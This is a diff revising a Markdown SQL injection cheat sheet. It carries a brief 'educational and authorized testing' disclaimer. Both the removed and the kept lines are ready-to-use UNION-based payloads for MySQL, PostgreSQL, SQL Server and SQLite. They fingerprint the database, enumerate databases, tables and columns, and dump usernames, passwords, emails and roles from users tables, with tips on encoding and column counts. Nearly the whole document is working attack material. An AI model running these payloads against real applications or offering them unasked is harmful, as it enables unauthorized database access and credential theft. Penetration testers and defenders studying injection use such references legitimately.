@@ -2,26 +2,26 @@
 
 > **For educational and authorized security testing only**
 
-Supports: **MySQL / MariaDB, PostgreSQL, SQLite, SQL Server**
+**Supported databases:** MySQL / MariaDB, PostgreSQL, SQLite, SQL Server
 
 ---
 
-## 📊 Database Detection
+## Database Detection
 
 ```sql
 -- Test all database types
 ' UNION SELECT 1,2,3,4,5,6,
     CASE
-        WHEN sqlite_version() IS NOT NULL THEN 'SQLite: '||sqlite_version()
-        WHEN @@version IS NOT NULL THEN 'MySQL: '||SUBSTRING(@@version,1,50)
-        WHEN version() IS NOT NULL THEN 'PostgreSQL: '||SUBSTRING(version(),1,50)
-        WHEN @@microsoftversion IS NOT NULL THEN 'MSSQL: '||CAST(@@microsoftversion AS varchar)
+        WHEN sqlite_version() IS NOT NULL THEN 'SQLite: ' || sqlite_version()
+        WHEN @@version IS NOT NULL THEN 'MySQL: ' || SUBSTRING(@@version,1,50)
+        WHEN version() IS NOT NULL THEN 'PostgreSQL: ' || SUBSTRING(version(),1,50)
+        WHEN @@microsoftversion IS NOT NULL THEN 'MSSQL: ' || CAST(@@microsoftversion AS varchar)
         ELSE 'Unknown'
     END
 ;-- -
 ```
 
-### Quick Individual Tests
+### Quick Checks
 
 ```sql
 -- SQLite
@@ -39,15 +39,13 @@ Supports: **MySQL / MariaDB, PostgreSQL, SQLite, SQL Server**
 
 ---
 
-## 🗃️ Database Enumeration
+## Database Enumeration
 
 ### MySQL / MariaDB
 
 ```sql
--- List all databases
+-- List databases
 ' UNION SELECT 1,2,3,4,5,6,schema_name FROM information_schema.schemata;-- -
-
-' UNION SELECT 1,2,3,4,5,6,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata);-- -
 
 -- Current database
 ' UNION SELECT 1,2,3,4,5,6,DATABASE();-- -
@@ -56,10 +54,8 @@ Supports: **MySQL / MariaDB, PostgreSQL, SQLite, SQL Server**
 ### PostgreSQL
 
 ```sql
--- List all databases
+-- List databases
 ' UNION SELECT 1,2,3,4,5,6,datname FROM pg_database;-- -
-
-' UNION SELECT 1,2,3,4,5,6,(SELECT string_agg(datname, ', ') FROM pg_database);-- -
 
 -- Current database
 ' UNION SELECT 1,2,3,4,5,6,current_database();-- -
@@ -68,10 +64,8 @@ Supports: **MySQL / MariaDB, PostgreSQL, SQLite, SQL Server**
 ### SQL Server
 
 ```sql
--- List all databases
+-- List databases
 ' UNION SELECT 1,2,3,4,5,6,name FROM master..sysdatabases;-- -
-
-' UNION SELECT 1,2,3,4,5,6,(SELECT name FROM master..sysdatabases FOR XML PATH(''));-- -
 
 -- Current database
 ' UNION SELECT 1,2,3,4,5,6,DB_NAME();-- -
@@ -80,149 +74,118 @@ Supports: **MySQL / MariaDB, PostgreSQL, SQLite, SQL Server**
 ### SQLite
 
 ```sql
--- Only main database
+-- Main database only
 ' UNION SELECT 1,2,3,4,5,6,'main';-- -
 ```
 
 ---
 
-## 📋 Table Enumeration
+## Table Enumeration
 
 ### MySQL / MariaDB
 
 ```sql
--- All tables in current database
-' UNION SELECT 1,2,3,4,5,6,table_name FROM information_schema.tables WHERE table_schema=DATABASE();-- -
-
-' UNION SELECT 1,2,3,4,5,6,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE());-- -
-
--- Find user / credential tables
-' UNION SELECT 1,2,3,4,5,6,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()
-AND (table_name LIKE '%user%' OR table_name LIKE '%pass%' OR table_name LIKE '%auth%'));-- -
+' UNION SELECT 1,2,3,4,5,6,table_name
+FROM information_schema.tables
+WHERE table_schema = DATABASE();-- -
 ```
 
 ### PostgreSQL
 
 ```sql
--- All tables in public schema
-' UNION SELECT 1,2,3,4,5,6,tablename FROM pg_tables WHERE schemaname='public';-- -
-
-' UNION SELECT 1,2,3,4,5,6,(SELECT string_agg(tablename, ', ') FROM pg_tables WHERE schemaname='public');-- -
+' UNION SELECT 1,2,3,4,5,6,tablename
+FROM pg_tables
+WHERE schemaname = 'public';-- -
 ```
 
 ### SQL Server
 
 ```sql
--- All user tables
-' UNION SELECT 1,2,3,4,5,6,name FROM sysobjects WHERE xtype='U';-- -
-
-' UNION SELECT 1,2,3,4,5,6,(SELECT name FROM sysobjects WHERE xtype='U' FOR XML PATH(''));-- -
+' UNION SELECT 1,2,3,4,5,6,name
+FROM sysobjects
+WHERE xtype = 'U';-- -
 ```
 
 ### SQLite
 
 ```sql
--- All tables
-' UNION SELECT 1,2,3,4,5,6,name FROM sqlite_master WHERE type='table';-- -
-
--- User tables only
-' UNION SELECT 1,2,3,4,5,6,(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%');-- -
+' UNION SELECT 1,2,3,4,5,6,name
+FROM sqlite_master
+WHERE type = 'table'
+AND name NOT LIKE 'sqlite_%';-- -
 ```
 
 ---
 
-## 📝 Column Enumeration
+## Column Enumeration
 
 ### MySQL / MariaDB
 
 ```sql
--- Columns from specific table
-' UNION SELECT 1,2,3,4,5,6,column_name FROM information_schema.columns WHERE table_name='users' AND table_schema=DATABASE();-- -
-
-' UNION SELECT 1,2,3,4,5,6,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users' AND table_schema=DATABASE());-- -
-
--- Find password columns
-' UNION SELECT 1,2,3,4,5,6,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'
-AND (column_name LIKE '%pass%' OR column_name LIKE '%pwd%' OR column_name LIKE '%hash%'));-- -
+' UNION SELECT 1,2,3,4,5,6,column_name
+FROM information_schema.columns
+WHERE table_name = 'users'
+AND table_schema = DATABASE();-- -
 ```
 
 ### PostgreSQL
 
 ```sql
-' UNION SELECT 1,2,3,4,5,6,column_name FROM information_schema.columns WHERE table_name='users' AND table_schema='public';-- -
+' UNION SELECT 1,2,3,4,5,6,column_name
+FROM information_schema.columns
+WHERE table_name = 'users'
+AND table_schema = 'public';-- -
 ```
 
 ### SQL Server
 
 ```sql
-' UNION SELECT 1,2,3,4,5,6,name FROM syscolumns WHERE id=OBJECT_ID('users');-- -
+' UNION SELECT 1,2,3,4,5,6,name
+FROM syscolumns
+WHERE id = OBJECT_ID('users');-- -
 ```
 
 ### SQLite
 
 ```sql
-' UNION SELECT 1,2,3,4,5,6,name FROM pragma_table_info('Users');-- -
-
-' UNION SELECT 1,2,3,4,5,6,(SELECT GROUP_CONCAT(name) FROM pragma_table_info('Users'));-- -
+' UNION SELECT 1,2,3,4,5,6,name
+FROM pragma_table_info('Users');-- -
 ```
 
 ---
 
-## 🔓 Data Extraction
-
-### Universal
+## Data Extraction
 
 ```sql
--- Extract specific columns
-' UNION SELECT 1,2,3,4,5,6,username||':'||password FROM users;-- -
-
--- Extract with formatting
-' UNION SELECT 1,2,3,4,5,6,
-    (SELECT GROUP_CONCAT(username||' -> '||password, CHAR(10)) FROM users)
-;-- -
-```
-
-### MySQL Specific
-
-```sql
-' UNION SELECT 1,2,3,4,5,6,
-    CONCAT(id, '|', username, '|', password, '|', email)
+-- Username and password
+' UNION SELECT 1,2,3,4,5,6,username || ':' || password
 FROM users;-- -
 ```
 
-### SQLite Specific
+### MySQL Example
 
 ```sql
 ' UNION SELECT 1,2,3,4,5,6,
-    (SELECT GROUP_CONCAT(
-        Id||' | '||username||' | '||email||' | '||password||' | '||role,
-        CHAR(10)
-    ) FROM Users)
-;-- -
+CONCAT(id,'|',username,'|',password,'|',email)
+FROM users;-- -
+```
+
+### SQLite Example
+
+```sql
+' UNION SELECT 1,2,3,4,5,6,
+(SELECT GROUP_CONCAT(
+    id || '|' || username || '|' || email || '|' || password || '|' || role,
+    CHAR(10)
+) FROM Users);
+-- -
 ```
 
 ---
 
-## 🚀 Advanced Extraction (SQLite)
+## Notes
 
-```sql
-' UNION SELECT 1,2,3,4,5,6,
-    (SELECT '=== DATABASE DUMP ==='||CHAR(10)||CHAR(10)||
-            'VERSION: '||sqlite_version()||CHAR(10)||CHAR(10)||
-            '=== TABLES ==='||CHAR(10)||
-            (SELECT GROUP_CONCAT(name||': '||sql, CHAR(10)||CHAR(10)) FROM sqlite_master WHERE type='table')||
-            CHAR(10)||'=== DATA ==='||CHAR(10)||
-            '--- USERS ---'||CHAR(10)||
-            (SELECT GROUP_CONCAT(username||':'||password||' ('||role||')', CHAR(10)) FROM Users)
-    )
-;-- -
-```
-
----
-
-## ⚠️ Notes
-
-* Replace `'` with URL encoding `%27` if needed
-* Use `-- -` or `#` for comments depending on DB
-* Adjust column count `(1,2,3,4,5,6)` based on target
-* Use `LIMIT` / `OFFSET` for large outputs
+* Adjust column count `(1,2,3,4,5,6)` to match the target query
+* Use `-- -` or `#` for comments depending on database
+* URL encode `'` as `%27` when required
+* Use `LIMIT` / `OFFSET` for large tables
